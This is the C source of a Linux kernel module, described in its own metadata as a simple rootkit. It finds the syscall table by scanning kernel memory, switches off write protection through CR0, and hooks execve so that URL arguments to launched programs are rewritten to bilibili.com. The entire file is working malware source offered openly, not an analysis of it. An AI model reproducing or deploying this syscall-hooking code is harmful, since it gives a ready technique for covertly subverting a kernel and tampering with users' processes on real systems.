#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <asm/paravirt.h> // read_cr0, write_cr0
#include <linux/string.h>
#include <asm/uaccess.h> // play with userspace pointers


static void **sys_call_table;
static unsigned long old_cr0;

/* patterns to be matched */
static char *patterns[] = {"http://", "https://", "www."};
static long pattern_len[] = {7, 8, 4}, max_pattern_len = 8;
static long nr_patterns = 3;

static char *dst_url = "https://www.bilibili.com";


static asmlinkage long (*old_sys_execve)(const char __user *filename,
					 const char __user *const __user *argv,
					 const char __user *const __user *envp);


asmlinkage long new_sys_execve(const char __user *filename,
			       /* discard the const qualifier so we
				* can change the arguments */
			       char __user *const __user *argv,
			       const char __user *const __user *envp)
{
  
  char __user *const __user *argv_head = argv;
  char __user *curr_arg;  /* the kernel space address of the current argument */
  char kbuf[32];
  register long i;

  /* translate *argv_head to kernel space address before we can read things */
  copy_from_user(&curr_arg, argv_head, sizeof(char *));
  while (curr_arg) {
    /* grab the userspace date to see if we're interested in it */
    copy_from_user(kbuf, curr_arg, max_pattern_len);
    for (i = 0; i < nr_patterns; ++i) {
      if (!strncmp(kbuf, patterns[i], pattern_len[i])) {
	/* pattern spotted, replace the url with bilibili.com */
	copy_to_user(curr_arg, dst_url, strlen(dst_url) + 1);
      }
    }

    /* read out the address of the next argument string */
    copy_from_user(&curr_arg, ++argv_head, sizeof(char *));
  }

  return old_sys_execve(filename, (const char * const *)argv, envp);
}


static void **aquire_sys_call_table(void)
{
  /* start searching for syscall table from PAGE_OFFSET, where the kernel
   * address space begins, all the way to ULLONG_MAX.
   */
  unsigned long int offset = PAGE_OFFSET;
  void **sct;

  while (offset < ULLONG_MAX) {
    sct = (void **)offset;

    if (sct[__NR_close] == (void *) sys_close) {
      pr_warn("lkm-rootkit: Syscall table found at: %lx\n", offset);
      return sct;
    }

    offset += sizeof(void *);
  }

  return NULL;
}

static int __init rootkit_start(void)
{
  /* Find the syscall table in memory */
  if(!(sys_call_table = aquire_sys_call_table()))
    return -1;

  /* turn off memory protection by masking out the relevant bit in cr0,
   * so we will be able to change the syscall table.
   */
  old_cr0 = read_cr0();
  write_cr0(old_cr0 & ~0x00010000);

  /* change the syscall table to hook sys_exceve() */
  old_sys_execve = (void *)sys_call_table[__NR_execve]; 
  sys_call_table[__NR_execve] = (unsigned long *)new_sys_execve;

  /* turn on memory protection again, just to be polite */
  write_cr0(old_cr0);

  return 0;
}

static void __exit rootkit_end(void)
{
  if(!sys_call_table) {
    return;
  }

  /* restore the orginal sys_execve() */
  write_cr0(old_cr0 & ~0x00010000);
  sys_call_table[__NR_execve] = (unsigned long *)old_sys_execve;
  write_cr0(old_cr0);
}

module_init(rootkit_start);
module_exit(rootkit_end);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("a simple lkm rootkit for fun and profit.");
MODULE_AUTHOR("Zhongze Liu <blackskygg@gmail.com");
